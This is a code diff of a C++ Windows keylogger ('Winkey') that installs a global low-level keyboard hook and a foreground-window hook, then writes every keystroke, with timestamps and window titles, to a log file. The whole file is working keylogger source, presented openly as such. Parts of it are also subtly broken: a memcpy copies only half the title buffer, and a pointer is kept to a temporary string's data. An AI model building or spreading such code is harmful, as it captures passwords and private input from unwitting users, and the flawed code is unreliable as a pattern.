@@ -1,6 +1,9 @@
 #include "Winkey.hpp"
 
 std::wofstream	Winkey::_logFile;
+wchar_t			Winkey::_windowTitle[256];
+HWND		    Winkey::_currentWindow;
+wchar_t			*Winkey::_keyStroke;
 
 Winkey::Winkey(): _logFileName(TW_LOGFILE) {
     // Prevent multiple instances of this program
@@ -24,14 +27,14 @@ void Winkey::setHooks() {
     _winEventHook = SetWinEventHook(
         EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
         NULL,
-        WinEventProc,
+        winEventProc,
         0, 0,
         WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
     );
     if (!_winEventHook) throw HookSettingFailureException();
 
     // Install global low-level keyboard hook to intercept keystrokes
-    _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
     if (!_keyboardHook) throw HookSettingFailureException();
 }
 
@@ -46,41 +49,55 @@ void Winkey::run() {
     while (GetMessage(&msg, NULL, 0, 0)) {}
 }
 
+// Log the keystroke data to the log file
+void Winkey::logToFile() {
+    static HWND lastWindow = nullptr;
+
+    // Only log the window title if it has changed
+    if (_currentWindow != lastWindow) {
+        time_t      now = time(nullptr);
+        // Converts time_t into a tm structure representing the local time
+        //  (hours, minutes, day, month, etc.)
+        struct tm   localTime {};
+        if (_windowTitle && localtime_s(&localTime, &now) == 0) {
+            // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
+            // `L` is for wide characters (Unicode)
+            _logFile << L"\n[" << std::setfill(L'0')
+                    << std::setw(2) << localTime.tm_mday << L"."
+                    << std::setw(2) << (localTime.tm_mon + 1) << L"."
+                    << (localTime.tm_year + 1900) << L" "
+                    << std::setw(2) << localTime.tm_hour << L":"
+                    << std::setw(2) << localTime.tm_min << L":"
+                    << std::setw(2) << localTime.tm_sec << L"] - '"
+                    << _windowTitle << L"'" << std::endl;
+        }
+    }
+    lastWindow = _currentWindow;
+
+     _logFile << _keyStroke;
+    // Ensure that everything written to the file is immediately pushed to disk
+    _logFile.flush();
+}
+
 // Write the timestamp + current active window name to the log file
-void CALLBACK Winkey::WinEventProc(
+void CALLBACK Winkey::winEventProc(
     const HWINEVENTHOOK /*hWinEventHook*/, const DWORD event, const HWND hwnd,
     LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
 )
 {
-    static HWND lastWindow = nullptr;
-
+    _currentWindow = hwnd;
     if (event == EVENT_SYSTEM_FOREGROUND) {
-        if (hwnd != lastWindow)
-        {
-            lastWindow = hwnd;
+        // We use wide characters (wchar_t) + Unicode (W) version of the function
+        wchar_t windowTitle[256] = {};
+        GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
 
-            // We use wide characters (wchar_t) + Unicode (W) version of the function
-            wchar_t windowTitle[256];
-            GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
+        // Sanitize the window title
+        for (size_t i = 0; windowTitle[i] != L'\0'; ++i)
+            if (!isascii(windowTitle[i]))
+                windowTitle[i] = L'?';  // replace non-printable chars
 
-            time_t      now = time(nullptr);
-            // Converts time_t into a tm structure representing the local time
-            //  (hours, minutes, day, month, etc.)
-            struct tm   localTime {};
-            if (localtime_s(&localTime, &now) == 0) {
-                // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
-                // `L` is for wide characters (Unicode)
-                _logFile << std::endl; // Force new line before the entry
-                _logFile << L"[" << std::setfill(L'0')
-                        << std::setw(2) << localTime.tm_mday << L"."
-                        << std::setw(2) << (localTime.tm_mon + 1) << L"."
-                        << (localTime.tm_year + 1900) << L" "
-                        << std::setw(2) << localTime.tm_hour << L":"
-                        << std::setw(2) << localTime.tm_min << L":"
-                        << std::setw(2) << localTime.tm_sec << L"] - '"
-                        << windowTitle << L"'" << std::endl;
-            }
-        }
+        // Save the current window title to log it later
+        memcpy(_windowTitle, windowTitle, 256);
     }
 }
 
@@ -101,7 +118,7 @@ void CALLBACK Winkey::WinEventProc(
  *              (specifies how parameters are passed and who cleans the stack).
  */
 
-LRESULT CALLBACK Winkey::LowLevelKeyboardProc(
+LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
     const int nCode, const WPARAM wParam, const LPARAM lParam
 )
 {
@@ -161,11 +178,10 @@ LRESULT CALLBACK Winkey::LowLevelKeyboardProc(
          *  the virtual key code.
          */
 
-        if (result > 0) _logFile << buffer;
-        else _logFile << GetKeyName(p->vkCode);
+        if (result > 0) _keyStroke = buffer;
+        else _keyStroke = (wchar_t *)getKeyName(p->vkCode).c_str();
 
-        // Ensure that everything written to the file is immediately pushed to disk
-        _logFile.flush();
+        logToFile();
     }
 
     // Pass the event to the next hook
